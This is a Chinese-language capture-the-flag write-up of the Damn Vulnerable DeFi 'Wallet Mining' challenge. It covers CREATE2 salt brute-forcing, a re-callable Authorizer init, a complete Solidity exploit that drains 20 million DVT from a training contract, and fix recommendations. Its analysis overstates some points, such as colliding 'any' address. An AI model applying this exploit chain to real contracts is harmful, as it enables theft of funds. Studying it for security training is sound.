# Wallet-Mining

## 一、题目简介

本题是一道结合**CREATE2 地址预言、Safe 多签钱包机制、权限管控绕过、链上钱包挖矿**的综合进阶题目，核心点为**可控 CREATE2 地址碰撞劫持 + 授权规则绕过 + 链上部署即控制权获取**。

题目部署了一套受控钱包挖矿系统，通过 `WalletDeployer` 合约统一部署 Safe 多签钱包，同时通过 `AuthorizerUpgradeable` 授权合约严格管控部署权限：仅白名单地址可部署指定目标地址合约。系统预先向一个**空地址**转入巨额 DVT 代币，该地址无任何代码、无拥有者，等待被部署合约劫持掌控。

题目核心目标：利用系统部署规则漏洞，通过暴力枚举 CREATE2 盐值，精准在目标空白地址部署可控 Safe 多签钱包，利用合法签名执行多签转账，**窃取目标地址全部 20,000,000 DVT 代币**，同时完成系统酬劳分发，满足通关校验。

核心环境参数：

- 目标空白地址余额：20,000,000 DVT

- 部署机制：基于 SafeProxyFactory + CREATE2 确定性地址部署

- 权限管控：Authorizer 合约白名单授权，限制指定地址部署目标地址合约

- 签名体系：Safe 多签 EIP-712 离线签名校验机制

- 奖励机制：WalletDeployer 部署成功后发放固定 DVT 酬劳给指定 ward 地址

攻击目标：精准碰撞盐值劫持目标空白地址、绕过授权限制部署恶意 Safe 钱包、合法签名提空全部代币、完成酬劳分发通关。

## 二、审计视角分析

### 1\. 核心高危漏洞：CREATE2 地址完全可控（钱包挖矿核心）

题目核心设计缺陷为：Safe 钱包部署地址**完全由初始化数据 + salt 盐值决定**，攻击者可离线暴力枚举 salt，精准命中预设的目标空白地址。

SafeProxyFactory 的 `createProxyWithNonce` 部署逻辑遵循 CREATE2 地址计算公式：

`proxyAddress = keccak256(0xff + 部署者地址 + keccak(initData + salt) + 合约字节码哈希)`

由于部署者地址（proxyFactory）、SafeProxy 字节码、初始化数据均可完全可控，仅需暴力遍历 salt 即可碰撞出**任意指定目标地址**。题目中巨额代币存放的空白地址无任何合约、无权限锁定，一旦部署可控 Safe 代理合约，即可完全掌控该地址资产。  
对应漏洞代码-WalletDeployer.sol文件  
```solidity
function drop(address aim, bytes memory wat, uint256 num) external returns (bool) {
    // 仅校验授权，未校验部署地址是否为敏感资产地址
    if (mom != address(0) && !can(msg.sender, aim)) {
        return false;
    }

    // 允许部署到任意 aim 地址，包括存有资产的空白地址
    if (address(cook.createProxyWithNonce(cpy, wat, num)) != aim) {
        return false;
    }

    return true;
}
```
### 2\. 授权合约权限可覆盖缺陷（AuthorizerUpgradeable）

授权合约初始仅允许白名单 ward 地址部署目标地址合约，但合约提供了公开的 `init` 初始化重置函数。该函数无任何权限校验，**任意用户均可调用重置授权规则**，覆盖原有白名单，将自身设置为目标地址的唯一授权部署者。

漏洞本质：授权合约初始化逻辑未做防重入、防重置保护，已部署状态下仍可被任意账户重置权限，彻底破坏原有访问控制体系。  
对应漏洞代码-AuthorizerUpgradeable.sol文件  
```solidity
function init(address[] memory _wards, address[] memory _aims) external {
    // 无任何权限校验，任何人都能调用
    require(needsInit != 0, "cannot init");
    
    for (uint256 i = 0; i < _wards.length; i++) {
        _rely(_wards[i], _aims[i]);
    }
    
    needsInit = 0;
}
```
### 3\. Safe 多签签名可控缺陷

题目提供了用户测试账户的私钥，该账户为即将部署的 Safe 钱包唯一所有者。Safe 多签交易依赖 EIP-712 签名校验，攻击者可离线构造转账交易、计算合法交易哈希、使用用户私钥签名，生成**完全合法的交易签名**。

在成功部署 Safe 钱包后，可通过合法签名调用 `execTransaction` 执行转账，无任何签名绕过、权限校验障碍，直接提空合约余额。  
对应漏洞代码-Safe官方逻辑  
```solidity
function execTransaction(
    address to,
    uint256 value,
    bytes calldata data,
    Enum.Operation operation,
    uint256 safeTxGas,
    uint256 baseGas,
    uint256 gasPrice,
    address gasToken,
    address payable refundReceiver,
    bytes memory signatures
) public payable returns (bool success);
```

### 4\. WalletDeployer 部署逻辑无身份强校验

钱包部署合约`drop` 函数仅校验 Authorizer 授权规则，无额外部署者身份、调用链路校验。攻击者重置授权权限后，可任意调用 drop 函数，传入碰撞好的 salt 与初始化数据，精准在目标地址部署合约。  
对应漏洞代码-WalletDeployer.sol文件  
```solidity
function can(address u, address a) public view returns (bool y) {
    assembly {
        let m := sload(0)
        if iszero(extcodesize(m)) { stop() }
        // 直接调用外部授权合约，完全信任返回结果
        let p := mload(0x40)
        mstore(p, shl(0xe0, 0x4538c4eb)) // can(address,address)
        mstore(add(p, 0x04), u)
        mstore(add(p, 0x24), a)
        staticcall(gas(), m, p, 0x44, p, 0x20)
        y := mload(p)
    }
}
```

### 5\. 汇总致命缺陷

- CREATE2 地址完全可控，可暴力碰撞目标资产地址

- 授权合约可任意重置权限，原有白名单防护彻底失效

- Safe 多签可构造合法签名，无条件执行资产转账

- 部署流程无二次校验，攻击者可完整复刻部署流程劫持资产地址

## 三、开发者默认安全假设

1. **地址安全假设**：默认空白资产地址无法被任意用户精准部署合约，不会被恶意劫持。

2. **权限安全假设**：默认 Authorizer 授权规则永久有效，无法被外部用户篡改重置。

3. **签名安全假设**：默认多签交易仅合法用户可签名执行，攻击者无法伪造有效签名。

4. **部署安全假设**：默认仅白名单用户可部署目标地址合约，部署流程安全可控。

5. **资产安全假设**：默认空白地址无代码保护，资产处于安全托管状态。

## 四、同类项目通用审计盯点

1. **CREATE2 合约部署审计**：重点检查是否可通过盐值枚举碰撞关键地址，大额资产存放的空白地址禁止支持可控 CREATE2 部署。

2. **权限合约初始化校验**：所有授权、权限管理合约必须添加初始化锁，禁止已部署后重复重置权限。

3. **多签钱包签名机制**：检查签名私钥泄露风险、交易哈希计算逻辑、签名校验逻辑是否存在漏洞。

4. **代理部署流程风控**：统一合约部署入口需增加调用者身份、白名单、二次校验机制。

5. **空白资产地址防护**：大额资产禁止存放于无代码、无权限锁定的空白地址，极易被地址碰撞劫持。

## 五、完整解题思路

本题核心攻击链路：**枚举盐值碰撞目标地址 → 重置授权获取部署权限 → 精准部署可控 Safe 钱包 → 构造合法多签签名 → 提空全部资产 → 分发奖励通关**。

1. **构造 Safe 初始化数据**：创建单用户、1/1 签名阈值的 Safe 钱包初始化参数，固定钱包所有者为题目提供的用户账户。

2. **暴力枚举有效 Salt**：循环遍历 salt 盐值，通过 `vm.computeCreate2Address` 预计算部署地址，精准匹配题目目标资产地址，获取唯一有效盐值。

3. **构造提款交易与合法签名**：组装全额转账交易数据，基于 Safe 官方 EIP\-712 规则计算交易哈希，使用用户私钥生成合法交易签名。

4. **部署攻击合约执行攻击**：攻击合约内重置 Authorizer 授权，将自身设为合法部署者；调用 WalletDeployer 在目标地址部署 Safe 钱包。

5. **执行多签转账窃取资产**：通过合法签名调用 Safe 钱包 `execTransaction`，将目标地址全部 DVT 代币转出至用户账户。

6. **分发酬劳完成校验**：将 WalletDeployer 预留的部署酬劳转账至指定 ward 地址，满足全部通关条件。

## 六、报错复盘

### 报错1：call to non-contract address 部署地址不匹配回滚

**原因**：攻击合约硬编码地址与本地测试环境动态生成的目标地址不一致，导致 salt 匹配的地址与部署地址错位，目标地址无合约代码，调用多签函数报错。

**解决**：全局统一目标资产地址，仅在测试合约定义一次常量，攻击合约通过入参接收或同步常量，杜绝地址不匹配。

### 报错2：salt 循环遍历偏移导致部署失败

**原因**：循环自增逻辑导致最终 salt 数值偏移，匹配成功后多执行一次自增，传入错误盐值无法部署目标地址。

**解决**：精准捕获匹配成功的 salt 值，避免循环偏移，严格传入有效盐值部署合约。

### 报错3：Safe 交易哈希计算不规范

**原因**：手动拼接 EIP-712 域名分隔符、交易类型哈希出错，导致签名无效，交易执行失败。

**解决**：封装标准化 Safe 交易哈希计算工具函数，严格遵循官方编码规则，保证签名合法性。

### 报错4：权限重置失败无法部署合约

**原因**：未正确调用 Authorizer 初始化函数重置授权规则，沿用初始白名单权限，攻击者无部署权限。

**解决**：攻击合约构造函数优先重置授权，将自身添加为目标地址的唯一授权部署者。

## 七、EXP

### 1\. 工具合约 HelpUtils.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {CommonBase} from "forge-std/Base.sol";
import {Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {EIP712, MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/EIP712.sol";

contract HelpUtils is CommonBase {
    bytes32 public constant _TYPE_HASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

    function getSignature(uint256 privateKey, bytes32 digest) public pure returns (bytes memory signature) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        (v, r, s) = vm.sign(privateKey, digest);
        signature = abi.encodePacked(r, s, v);
    }

    function getEIP712Digest(address verifyingContract, bytes32 structHash) public view returns (bytes32) {
        (, string memory name, string memory version, uint256 chainId,,,) = EIP712(verifyingContract).eip712Domain();
        bytes32 _domainSeparatorV4 = keccak256(
            abi.encode(_TYPE_HASH, keccak256(bytes(name)), keccak256(bytes(version)), chainId, verifyingContract)
        );
        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4, structHash);
    }

    function getTransactionHash_Safe(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce,
        address verifyingContract
    ) public view returns (bytes32) {
        return keccak256(
            encodeTransactionData(
                to,
                value,
                data,
                operation,
                safeTxGas,
                baseGas,
                gasPrice,
                gasToken,
                refundReceiver,
                _nonce,
                verifyingContract
            )
        );
    }

    function encodeTransactionData(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce,
        address verifyingContract
    ) internal view returns (bytes memory) {
        bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;

        bytes32 safeTxHash = keccak256(
            abi.encode(
                SAFE_TX_TYPEHASH,
                to,
                value,
                keccak256(data),
                operation,
                safeTxGas,
                baseGas,
                gasPrice,
                gasToken,
                refundReceiver,
                _nonce
            )
        );
        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator_safe(verifyingContract), safeTxHash);
    }

    function domainSeparator_safe(address verifyingContract) internal view returns (bytes32) {
        bytes32 DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, block.chainid, verifyingContract));
    }
}

```

### 2\. 攻击合约 WalletMiningAttacker.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Enum, Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WalletMiningAttacker {
    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

    constructor(
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        bytes memory wat,
        uint256 salt,
        bytes memory execT_data,
        address ward
    ) {
        address attack = address(this);
        address[] memory _wards = new address[](1);
        address[] memory _aims = new address[](1);
        _wards[0] = attack;
        _aims[0] = USER_DEPOSIT_ADDRESS;
        
        // 重置授权，获取目标地址部署权限
        authorizer.init(_wards, _aims);
        // 精准部署 Safe 合约至目标资产地址
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, wat, salt);

        // 解码交易数据并执行多签转账
        {
            (
                address to,
                uint256 value,
                bytes memory data,
                Enum.Operation operation,
                uint256 safeTxGas,
                uint256 baseGas,
                uint256 gasPrice,
                address gasToken,
                address payable refundReceiver,
                bytes memory signatures
            ) = abi.decode(
                execT_data,
                (address, uint256, bytes, Enum.Operation, uint256, uint256, uint256, address, address, bytes)
            );

            Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
                to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures
            );
        }

        // 发放部署酬劳，满足通关校验
        DamnValuableToken(walletDeployer.gem()).transfer(ward, walletDeployer.pay());
    }
}

```

### 3\. 主测试解题合约

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

import {HelpUtils} from "./HelpUtils.sol";
import {WalletMiningAttacker} from "./WalletMiningAttacker.sol";

contract WalletMiningChallenge is Test, HelpUtils {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (user, userPrivateKey) = makeAddrAndKey("user");

        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        token = new DamnValuableToken();

        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer)
                )
            })
        );

        walletDeployer.rule(address(authorizer));

        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        address[] memory _owners = new address[](1);
        address ZEROAddr = address(0);
        _owners[0] = user;
        bytes memory initializer =
            abi.encodeCall(Safe.setup, (_owners, 1, ZEROAddr, "", ZEROAddr, ZEROAddr, 0, payable(0)));
        
        // 暴力枚举匹配目标地址的有效 Salt
        uint256 saltNonce;
        {
            bool flag;
            while (!flag) {
                address proxy_ = vm.computeCreate2Address(
                    keccak256(abi.encodePacked(keccak256(initializer), saltNonce)),
                    keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
                    address(proxyFactory)
                );
                if (proxy_ == USER_DEPOSIT_ADDRESS) {
                    flag = true;
                    break;
                }
                ++saltNonce;
            }
        }

        // 构造合法多签转账交易与签名
        bytes memory execT_data;
        {
            address to = address(token);
            uint256 value;
            bytes memory data = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
            Enum.Operation operation = Enum.Operation.Call;
            uint256 safeTxGas;
            uint256 baseGas;
            uint256 gasPrice;
            address gasToken;
            address payable refundReceiver;

            bytes32 hash_Tx = HelpUtils.getTransactionHash_Safe(
                to,
                value,
                data,
                operation,
                safeTxGas,
                baseGas,
                gasPrice,
                gasToken,
                refundReceiver,
                0,
                USER_DEPOSIT_ADDRESS
            );

            bytes memory signatures = HelpUtils.getSignature(userPrivateKey, hash_Tx);
            execT_data = abi.encode(
                to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures
            );
        }

        // 部署攻击合约执行完整攻击链路
        new WalletMiningAttacker(authorizer, walletDeployer, initializer, saltNonce, execT_data, ward);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        assertEq(vm.getNonce(user), 0, "User executed a tx");
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

```

## 八、合约修复方案

1. **权限合约初始化锁加固**：为 AuthorizerUpgradeable 新增初始化状态位，初始化完成后禁止重复调用 `init` 重置权限，锁定白名单规则。

2. **禁止空白大额资产地址部署**：在 WalletDeployer 部署逻辑中增加地址黑名单，禁止向无初始代码的空白大额资产地址部署合约，杜绝地址劫持。

3. **部署权限二次校验**：新增部署者身份校验、部署地址风控，仅允许指定白名单地址部署核心资产相关地址合约。

4. **Safe 部署参数校验**：限制 Safe 钱包初始化权限，禁止外部用户自定义部署参数碰撞敏感地址。

5. **加盐随机化防护**：部署合约强制添加服务端随机盐值，杜绝攻击者离线枚举碰撞目标地址。

## 九、漏洞总结

Wallet-Mining 关卡核心漏洞由**可控 CREATE2 地址碰撞 + 授权权限可任意重置**两大高危缺陷组合而成。开发者错误信任空白地址安全性与权限合约不可篡改特性，未做任何防地址枚举、防权限重置防护，导致攻击者可以精准劫持资产地址、部署可控多签钱包。

本题考察了 CREATE2 部署原理、Safe 多签 EIP-712 签名机制、链上权限管控、合约部署风控等综合知识，是**逻辑漏洞+地址预言漏洞**组合攻击题型，核心防御核心在于**锁定权限、杜绝可控地址碰撞、加固部署风控**。

[题目解法参考](https://github.com/alekoisaev/damn-vulnerable-defi-V4/blob/v4-solutions/test/wallet-mining/WalletMiningAttacker.sol)

